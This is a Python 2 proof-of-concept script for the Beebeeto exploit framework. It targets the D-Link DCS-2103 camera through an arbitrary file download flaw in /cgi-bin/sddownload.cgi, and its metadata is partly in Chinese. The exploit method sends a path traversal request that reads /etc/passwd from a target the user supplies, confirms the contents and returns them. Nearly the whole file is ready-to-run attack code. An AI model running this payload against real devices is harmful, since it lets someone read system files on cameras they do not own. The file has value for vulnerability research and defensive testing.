#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0149',
            'name': 'D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2014-11-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'D-Link',
            'vul_version': 'DCS-2103',
            'type': 'Arbitrary File Download',
            'tag': ['D-Link漏洞', '任意文件下载漏洞', '/cgi-bin/sddownload.cgi', 'cgi'],
            'desc': '''
                    Vulnerable is the next model: D-Link DCS-2103, Firmware 1.0.0. This model 
                    with other firmware versions also must be vulnerable.

                    I found these vulnerabilities at 11.07.2014 and later informed D-Link. But 
                    they haven't answered. It looks like they are busy with fixing 
                    vulnerabilities in DAP-1360, which I wrote about earlier.
                    ''',
            'references': ['http://www.intelligentexploit.com/view-details.html?id=20197',
            ]
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = '/cgi-bin/sddownload.cgi?file=/../../etc/passwd'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['passwd'] = content
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())